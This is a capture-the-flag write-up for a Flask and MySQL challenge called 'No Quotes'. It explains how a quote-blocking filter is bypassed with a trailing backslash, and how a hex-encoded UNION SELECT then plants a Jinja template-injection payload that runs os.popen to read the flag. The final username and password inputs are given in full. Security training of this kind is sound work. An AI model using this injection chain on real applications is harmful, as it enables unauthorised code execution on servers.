# No Quotes

### 1. Challenge Overview

In this challenge, we encounter a web application built with Python (Flask) and a MySQL database. Our goal is to read the flag located at `/root/flag.txt`. However, we cannot access the file system directly; we need to find a way to trick the server into executing a command for us.

This challenge teaches us about SQL Injection (SQLi), WAF Bypassing, and Server-Side Template Injection (SSTI).

### Step 1: Analyzing the Source Code

Upon reviewing `app.py`, two critical vulnerabilities jump out.

#### 1. The Vulnerable Login Query

In the `login()` function, the application constructs a SQL query using Python f-strings instead of parameterized queries.

```python
# app.py
query = (
    "SELECT id, username FROM users "
    f"WHERE username = ('{username}') AND password = ('{password}')"
)
```

This is a textbook SQL Injection vulnerability. Whatever we type into the username or password fields is pasted directly into the database command.

#### 2. The WAF (Web Application Firewall)

The developer realized raw SQL is dangerous, so they added a simple check:

```python
# app.py
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

This `waf` function blocks any input containing single (`'`) or double (`"`) quotes. This makes a standard injection like `' OR 1=1 --` impossible because we cannot use the quote to "break out" of the string literal.

#### 3. The SSTI Vulnerability

If we successfully log in, the `home()` function renders the page:

```python
# app.py
return render_template_string(open("templates/home.html").read() % session["user"])
```

It takes the username stored in the session and injects it directly into the HTML string before rendering it as a Flask template. If we can force the database to return a username that contains Python code (like `{{ 7*7 }}`), Flask will execute it. This is Server-Side Template Injection (SSTI).

### Step 2: Bypassing the WAF with a Backslash

We need to inject SQL commands, but we can't use quotes to close the `username` field. How do we break the query structure?

We can use the Backslash Escape trick.

If we input `test\` as the username, the query looks like this:

```sql
SELECT id, username FROM users WHERE username = ('test\') AND password = ('...')
```

In SQL, a backslash escapes the character immediately following it. Here, it escapes the single quote that was supposed to close the username.

Consequently, the database treats 'test\\') AND password = ( as a single string. It eats up the check for the password!

This leaves the `password` input field open to accept raw SQL commands.

### Step 3: Constructing the Payload

Now that we control the query logic via the password field, we need to create a fake user session that contains our malicious SSTI code.

We will use a `UNION SELECT` statement. This allows us to combine the results of the original query (which will return nothing effectively) with our own custom row.

We need our custom row to look like a valid user: `(id, username)`.

#### The Problem with Quotes (Again)

We want our username to be an SSTI payload, like:

\{{ config.\_\_class\_\_... \}}

However, typical SSTI payloads require quotes (e.g., `['os']`), which are blocked by the WAF.

#### The Solution: Hex Encoding

MySQL has a convenient feature: it allows you to write strings as Hexadecimal values. `0x61` is treated exactly the same as `'a'`. This allows us to write complex strings without using a single quote.

We need to convert our SSTI payload into Hex.

The Target SSTI Payload:

We want to execute /readflag. Based on readflag.c, executing this binary gives us the flag.

```python
{{ config.__class__.__init__.__globals__['os'].popen('/readflag').read() }}
```

Converted to Hex:

0x7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d

### Step 4: Putting It All Together

Let's assemble the final inputs.

Username: test\\

Password: ) UNION SELECT 1, 0x\[HEX\_PAYLOAD]#

#### Visualizing the executed query:

SQL

```sql
SELECT id, username FROM users 
WHERE username = ('test\') AND password = (') UNION SELECT 1,0x7b7b...#')
```

1. Red: `('test\') AND password = ('` is interpreted as the username string.
2. Blue: `) UNION SELECT 1, 0x...` is executed as SQL.
3. Green: `#` comments out the rest of the original query (the trailing `')`).

This query returns a user with ID `1` and a username equal to our malicious Python code. The application logs us in and saves that code into `session["user"]`.

When the page redirects to `/home`, the application tries to "say hello" to the user, effectively executing our code and printing the flag!

### Final Solution

Username:

```
test\
```

Password:

```
) UNION SELECT 1,0x7b7b636f6e6669672e5f5f636c6173735f5f2e5f5f696e69745f5f2e5f5f676c6f62616c735f5f5b276f73275d2e706f70656e28272f72656164666c616727292e7265616428297d7d#
```
